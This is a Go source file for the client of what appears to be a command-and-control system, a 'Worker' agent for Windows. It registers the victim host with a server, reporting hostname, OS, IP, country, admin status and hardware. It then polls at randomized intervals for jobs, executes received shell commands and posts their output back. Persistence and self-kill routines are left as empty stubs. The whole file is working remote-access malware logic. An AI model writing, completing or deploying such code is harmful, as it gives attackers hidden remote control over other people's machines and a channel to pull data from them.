package main

import (
	"Worker/system/win"
	"Worker/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

const (
	serverAddr = "http://127.0.0.1:5000"

	maxRetries = 10

	minDelay = 5
	maxDelay = 60
)

const (
	REGISTER = iota
	RESOURCE
	RETRIEVE
	REPORT
	UPLOAD
)

type Worker struct {
	id      string
	isAdmin bool
}

type HostInfo struct {
	Id       string `json:"id"`
	Hostname string `json:"hostname"`
	Os       string `json:"os"`
	IpAddr   string `json:"ip_addr"`
	Country  string `json:"country"`
	IsAdmin  bool   `json:"is_admin"`
}

type ResourceInfo struct {
	Gpu string `json:"gpu"`
	Cpu string `json:"cpu"`
	Ram string `json:"ram"`
}

type Job struct {
	Id      int    `json:"id"`
	Todo    string `json:"todo"`
	IsDone  bool   `json:"is_done"`
	Created string `json:"created"`
}

// TODO: check for wrong input?
func buildRequestUrl(reqType int, workerId, jobId string) string {
	baseUrl := serverAddr + "/api/workers/" + workerId
	switch reqType {
	case RETRIEVE:
		return baseUrl + "/jobs/undone"
	case REPORT:
		return baseUrl + "/jobs/" + jobId + "/report"
	case UPLOAD:
		return baseUrl + "/uploads"
	case RESOURCE:
		return baseUrl + "/resource-info"
	case REGISTER:
		return serverAddr + "/api/workers"
	}
	return ""
}

func NewWorker() *Worker {
	guid, _ := win.GetMachineGuid()
	guid, _ = utils.GuidStrToBase64Str(guid)
	return &Worker{
		id:      guid,
		isAdmin: win.HaveAdminRights(),
	}
}

// TODO: call this method only if worker not persisted!
func (w *Worker) register() bool {
	hostInfo := HostInfo{Id: w.id, IsAdmin: w.isAdmin}
	hostInfo.Hostname, _ = os.Hostname()
	hostInfo.Os, _ = win.GetOsName()
	hostInfo.IpAddr, hostInfo.Country = utils.GetMyIpCountry()

	reqBody, _ := json.Marshal(hostInfo)
	registerUrl := buildRequestUrl(REGISTER, w.id, "")

	for i := 1; i <= maxRetries; i++ {
		resp, err := http.Post(registerUrl, "application/json", bytes.NewBuffer(reqBody))
		if err == nil {
			resp.Body.Close()
			w.tellResourceInfo()
			return true
		}
		time.Sleep(time.Minute * time.Duration(i))
	}
	return false
}

func (w *Worker) tellResourceInfo() {
	resourceInfo := ResourceInfo{}
	resourceInfo.Gpu, _ = win.GetGpuName()
	resourceInfo.Cpu, _ = win.GetCpuName()
	totalRam, _ := win.GetTotalRam()
	resourceInfo.Ram = utils.ToReadableSize(totalRam)

	reqBody, _ := json.Marshal(resourceInfo)
	resourceInfoUrl := buildRequestUrl(RESOURCE, w.id, "")

	resp, err := http.Post(resourceInfoUrl, "application/json", bytes.NewBuffer(reqBody))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) poll() {
	jobsUrl := buildRequestUrl(RETRIEVE, w.id, "")
	errorN := 0
	for {
		resp, err := http.Get(jobsUrl)
		if err != nil {
			errorN++
			if errorN == maxRetries {
				w.kill()
				return
			}
			time.Sleep(time.Minute * time.Duration(errorN))
			continue
		}
		errorN = 0
		var jobs []Job
		err = json.NewDecoder(resp.Body).Decode(&jobs)
		if err != nil {
			fmt.Println(err)
			goto end
		}
		// TODO: sort jobs by create time
		for _, j := range jobs {
			fmt.Println(j.Todo)
			w.resolve(j)
		}
	end:
		time.Sleep(time.Duration(utils.RandomInt(minDelay, maxDelay)) * time.Second)
	}
}

func (w *Worker) resolve(job Job) {
	todo, args := utils.ParseJob(job.Todo)
	switch todo {
	case utils.UNKNOWN:
	case utils.SHELL_CMD:
		output, _ := win.ExecuteCommand(args...)
		w.report(job.Id, output)
	}
}

func (w *Worker) report(jobId int, rep string) { // TODO: accept only bytes?
	reportUrl := buildRequestUrl(REPORT, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", bytes.NewBuffer([]byte(rep)))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) persist() {

}

func (w *Worker) kill() {

}

func (w *Worker) run() {
	// if !w.persisted()
	// w.persist()
	if !w.register() {
		w.kill()
	} else {
		w.poll()
	}
}
